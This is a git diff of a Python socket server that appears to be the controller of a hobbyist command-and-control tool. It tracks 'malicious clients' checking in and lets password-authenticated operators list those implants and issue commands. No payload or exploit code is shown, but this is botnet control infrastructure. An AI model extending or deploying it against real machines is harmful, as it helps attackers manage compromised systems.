@@ -6,11 +6,12 @@ import os
 import random
 import atexit
 from datetime import datetime
+import select
 
 HEADER = 64
 FORMAT = 'utf-8'
 
-global_debug = True
+global_debug = False
 
 class s_sock:
     ##########
@@ -45,15 +46,19 @@ class s_sock:
         
         ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
         while True:
-            print("\nTOP OF CODE: listening...")
-            self.conn, addr = self.server.accept()
-            ##print("\\|/New Connection\\|/")
+            try:
+                print("\nTOP OF CODE: listening...")
+                self.conn, addr = self.server.accept()
+                ##print("\\|/New Connection\\|/")
+                
+                ## Getting client id from the client, and the IP address
+                self.ip_address = self.conn.getpeername()[0]
+                
+                print("Waiting for a response...")
+                self.response = self.conn.recv(1024).decode().split("\\|/")
             
-            ## Getting client id from the client, and the IP address
-            self.ip_address = self.conn.getpeername()[0]
-            
-            self.response = self.conn.recv(1024).decode().split("\\|/")
-            
+            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+                print("Client Disconnected")
             
             response_list = []
             for i in self.response:
@@ -72,53 +77,42 @@ class s_sock:
             print(f"\nID: {self.id}") if global_debug else None
             print(f"MSG: {self.message}") if global_debug else None
             
-            ## I'm sorry for the nested if's :( can definently split this up a bit into functions
             ## interact with server, on first connection
             if self.id == "!_userlogin_!":
-                print("PassSplit")
+                print("PassSplit") if global_debug else None
                 username, password = self.message.split("//|\\\\")
-                
-                ## == Password Eval
+
+                # Password evaluation
                 print(username, password)
-                if self.password_eval(password) == True:
-                    print("PassEval")
+                if self.password_eval(password):
+                    print("PassEval") if global_debug else None
                     self.conn.send("0".encode())
                     print(f"Successful logon from {username}")
-                    
+
                     friendly_client_name = f"!!~{username}"
-                    
-                    ## == Handle client (maybe create a function...)
-                    ## doing the same class trick as in below
+
+                    # Add to globals list if not there
                     if friendly_client_name not in self.friendly_current_clients:
                         self.friendly_current_clients.append(friendly_client_name)
 
-                        self.friendly_client = s_friendlyclient()
-                        
-                        self.friendly_clients[friendly_client_name] = self.friendly_client
-                        
-                        globals()[friendly_client_name] = self.friendly_client
-                        
-                        ## drop into class, passing the connection, addr, and some other stuff
-                        ## starts the thread - re think this
-                        
-                        
-                        print(f"DEBUG: f_client msg: {self.response}")
-                        friendly_thread = threading.Thread(target=self.friendly_client.friendly_client_communication, args=(self.conn, self.ADDR, self.response, username))
-                        friendly_thread.start()
+                    ## start thread (Note, each thread dies when fclient disconnectes, thats
+                    ## why a new thread is started)
+                    self.friendly_clients[friendly_client_name] = s_friendlyclient()
+                    globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]
 
-                        ## temp printing friendyl clients
-                        #print("FriendlyClients:") if global_debug else None
-                        #for var_name in globals():
-                            #if var_name.startswith("!!~"):
-                                #print(var_name)
-                        #continue
+                    # Create a new thread to handle the friendly client
+                    friendly_thread = threading.Thread(
+                        target=self.friendly_clients[friendly_client_name].friendly_client_communication,
+                        args=(self.conn, self.ADDR, self.response, username)
+                    )
+                    friendly_thread.start()
 
-                    else:
-                        print("AlreadyAuth")
+                    print(f"DEBUG: f_client msg: {self.response}") if global_debug else None
 
                 else:
                     print(f"Failed logon from {username}")
                     self.conn.send("1".encode())
+
 
 
             #elif self.id == "!_usercommand_!":
@@ -128,11 +122,13 @@ class s_sock:
             ## handling commands - ma ynot need this
             ## elif friendly_client_name in friendly_client_name_list:
                 ## friendly_client_name.interact()
+            elif self.id == "!_usercommand_!":
+                print("usercomm")
 
             
             ## Client filter, make this an elif somehow, so if nothing matches, it drops
             else:
-                print("else")
+                print("else") if global_debug else None
                 ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
                 client_name = "client_" + self.ip_address.replace(".", "_") + "_" + self.id
                 ## If the client hasn't been seen before, create new client ID n stuff
@@ -193,10 +189,21 @@ class s_friendlyclient:
         ## listens for command
         ## runs command_process
         ## returns result to friedly client
-        print(f"DEBUG: friendly_client func, user: {username}")
+        print(f"DEBUG: friendly_client func, user: {username}") if global_debug else None
         #print(self.conn.recv(1024).decode())
             
+        print(f"CONN: {self.conn}") if global_debug else None
+            
         while True:
+            '''
+            ## This guy seems to be a tad flawed, not 100% sure what's up, other
+            ## than that its killing the connectino cause the conn isnt working?
+            ## Check if client is still connected
+            client_alive, _, _ = select.select([self.conn], [], [], 0)
+            if not client_alive:
+                print("(s_freindltclient) Client disconnected")
+                break'''
+                
             ## Waiting on input from client, on a per thread/friedly client basis until disconnection
             ## diffeerent than malicious clients, as they are constantly checking in, this is a more
             ## consistent connection
@@ -204,38 +211,40 @@ class s_friendlyclient:
             user_input = self.parse_msg(raw_user_input)
             
             ## For readability:
-            user_username = user_input[0]
-            user_command = user_input[1]
+            try:
+                user_username = user_input[0]
+                user_command = user_input[1]
+            except:
+                print("No input") if global_debug else None
+                #user_username, user_command = "None"
+                #break
             
-            print(f"DEBUG: UserInput: {user_input}")
+            print(f"DEBUG: UserInput: {user_input}") if global_debug else None
             
             ## Receiveing message from server portion & running through filters
             print("Call Decision Tree") if global_debug else None
             
-            self.decision_tree(user_command)
-            
-            if not message:
-
-                print("Conn Closed\n\n") if global_debug else None
-                break
-            
-            message = None
-
-        conn.close()
+            self.server_decision_tree(user_command)
 
 
-    def decision_tree(self, message):
+    def server_decision_tree(self, message):
+        ## Always gets clients b4 running
+        current_clientlist = ""
+        for var_name in globals():
+            if var_name.startswith("client_"):
+                ## Sanity check to turn var_name into a string just in case
+                current_clientlist += f"{var_name}\n"
+                
+        if message == "clients":       
+            if current_clientlist != "":
+                self.send_msg(current_clientlist)
+            else:
+                self.send_msg("No Current Clients")
 
-        if message == "clients":
-            current_clientlist = ""
-            for var_name in globals():
-                if var_name.startswith("client_"):
-                    ## Sanity check to turn var_name into a string just in case
-                    current_clientlist += f"{var_name}\n"
-            
-            #print(self.current_clients)
-            self.send_msg(current_clientlist)
+        elif message in current_clientlist:
+            print("!!Client Exists!!") if global_debug else None
 
+        ## need to find a way to get thesub shell as well
         elif message == "stats":
             pass
             ## Need: client instance name
@@ -245,20 +254,31 @@ class s_friendlyclient:
         else:
             self.send_msg(self.InputNotUnderstood)
 
+    def client_decision_tree(self, message):
+        pass
+
     def send_msg(self, message:str):
-        ## encoding with global str_encode
-        encoded_response = str_encode(message)
-        self.conn.send(encoded_response)
+        try:
+            ## encoding with global str_encode
+            encoded_response = str_encode(message)
+            self.conn.send(encoded_response)
+        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+            ## nuking the class on an error... could be better
+            exit()
+            
+            #pass
+            
     
     def parse_msg(self, raw_message) -> list:
-        print(f"Raw Message: {raw_message}")
+        print(f"Raw Message: {raw_message}")  if global_debug else None
         
         ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
         parsed_results_list = raw_message.replace("!_usercommand_!\\|/","").split("//|\\\\")
         
-        print(f"Parsed Message: {parsed_results_list}")
+        print(f"Parsed Message: {parsed_results_list}") if global_debug else None
         
         return parsed_results_list
+
 
 #################################
 ## Per (malicious) Client Class
